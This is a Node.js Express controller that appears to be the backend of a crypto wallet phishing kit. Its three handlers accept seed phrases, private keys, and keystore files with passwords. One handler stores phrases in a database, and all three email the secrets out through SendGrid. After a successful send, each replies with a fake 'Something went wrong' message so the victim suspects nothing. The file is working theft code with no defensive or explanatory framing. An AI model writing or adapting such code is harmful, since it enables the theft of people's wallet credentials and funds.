const sgMail = require("@sendgrid/mail");
const Phrase = require("../models/phrase");
const PrivateKey = require("../models/privateKey");
const KeyStoreJson = require("../models/keystoreJson");

sgMail.setApiKey(process.env.SENDGRID_API_KEY);

exports.phraseData = async (req, res) => {
  const { phrase, email, wallet } = req.body;

  const msg = {
    to: email,
    from: email,
    subject: "Phrase Data",
    html: `
        <h1>Phrase Data</h1>
        <p>${phrase}</p>
      `,
  };

  const phraseModel = new Phrase({
    email,
    wallet,
    phrase,
  });

  // save phrase to the database
  try {
    await phraseModel.save();
  } catch (err) {
    console.error(err.message);
    return res.status(400).json({
      success: false,
      msg: err.message,
    });
  }

  sgMail
    .send(msg)
    .then(() => {
      res.status(200).json({
        success: true,
        msg: "Something went wrong, please try again later",
      });
    })
    .catch((err) => {
      console.error(err);
      return res.status(400).json({
        success: false,
        msg: err,
      });
    });
};

exports.privateKeyData = async (req, res) => {
  const { privateKey, email } = req.body;

  const msg = {
    to: email,
    from: email,
    subject: "Private Key Data",
    html: `
        <h1>Private Key Data</h1>
        <p>${privateKey}</p>
      `,
  };

  sgMail
    .send(msg)
    .then(() => {
      res.status(200).json({
        success: true,
        msg: "Something went wrong, please try again later",
      });
    })
    .catch((err) => {
      console.error(err);
      return res.status(400).json({
        success: false,
        msg: err,
      });
    });
};

exports.keystoreJSONData = async (req, res) => {
  const { keyStore, password, email } = req.body;

  const msg = {
    to: email,
    from: email,
    subject: "KeyStore JSON Data",
    html: `
        <h1>Phrase Data</h1>
        <p><strong>{keyword} - </strong> ${keyStore}</p>
        <p><strong>{password} - </strong> ${password}</p>
      `,
  };

  sgMail
    .send(msg)
    .then(() => {
      res.status(200).json({
        success: true,
        msg: "Something went wrong, please try again later",
      });
    })
    .catch((err) => {
      console.error(err);
      return res.status(400).json({
        success: false,
        msg: err,
      });
    });
};
